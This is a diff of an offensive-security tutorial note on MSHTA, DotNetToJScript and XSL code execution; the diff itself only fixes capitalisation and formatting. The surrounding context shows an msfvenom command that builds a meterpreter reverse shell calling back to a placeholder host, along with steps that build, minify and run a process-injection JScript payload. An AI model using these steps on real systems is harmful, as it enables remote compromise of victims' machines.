@@ -13,7 +13,7 @@ tags:
 ## Microsoft HTML Applications
 
 **Microsoft HTML Applications (MSHTA)** is a vector for client-side attacks to
-execute **Jscript** payloads, allowing us to execute `.hta` files with the
+execute **JScript** payloads, allowing us to execute `.hta` files with the
 `mshta.exe` application. Here's an example payload so we can better understand
 its structure:
 
@@ -34,7 +34,7 @@ its structure:
 ```
 
 Given the structure of this payload, we can see how we would go about smuggling
-our malicious Jscript. Here's an example invocation of this payload using
+our malicious JScript. Here's an example invocation of this payload using
 `mshta.exe`:
 
 ```powershell
@@ -46,8 +46,8 @@ $lPort = ${LPORT}
 ### MSHTA and SharpShooter
 
 Using [SharpShooter](https://github.com/X0RW3LL/SharpShooter/tree/master) we can
-generate an `.hta` payload to deliver a `meterpreter` reverse shell payload. We
-invoke the following to generate our `meterpreter` reverse shell payload:
+generate an `.hta` payload to deliver a **meterpreter** reverse shell payload.
+We invoke the following to generate our meterpreter reverse shell payload:
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=${LHOST} LPORT=${LPORT} -f raw -o shell.txt
@@ -135,8 +135,8 @@ public class TestClass
 }
 ```
 
-We invoke the following to use **DotNetToJScript** to generate a **JScript**
-payload that will invoke the code within our process injection assembly:
+We invoke the following to use **DotNetToJScript** to generate a JScript payload
+that will invoke the code within our process injection assembly:
 
 ```powershell
 DotNetToJScript.exe --lang=JScript -o="pwn.js" "ExampleAssembly.dll"
@@ -148,7 +148,7 @@ We can test that our `pwn.js` payload works by invoking:
 . (Get-Command -Name "wscript.exe").Source .\pwn.js
 ```
 
-To reliably execute our **JScript** payload we use
+To reliably execute our JScript payload we use
 [uglify-js](https://www.npmjs.com/package/uglify-js) to minify the payload -
 here's an example invocation:
 
@@ -157,9 +157,9 @@ uglifyjs ./pwn.js > uglypwn.js
 ```
 
 Finally, we construct our malicious `.hta` payload that contains our minified
-**DotNetToJScript** **JScript** payload. This final payload will execute using
-**MSHTA**, delivering a **JScript** payload that loads our assembly to conduct
-process injection and execute a `meterpreter` reverse shell payload:
+DotNetToJScript JScript payload. This final payload will execute using MSHTA,
+delivering a JScript payload that loads our assembly to conduct process
+injection and execute a meterpreter reverse shell payload:
 
 <!-- prettier-ignore-start -->
 ```html
@@ -169,9 +169,9 @@ process injection and execute a `meterpreter` reverse shell payload:
 
 ## XSL
 
-We can also gain arbitrary **JScript** code executing using **Extensible
-Stylesheet Language (XSL)** documents. Here's an example `.xsl` document to gain
-JScript code execution:
+We can also gain arbitrary JScript code executing using **Extensible Stylesheet
+Language (XSL)** documents. Here's an example `.xsl` document to gain JScript
+code execution:
 
 ```xml
 <?xml version='1.0'?>
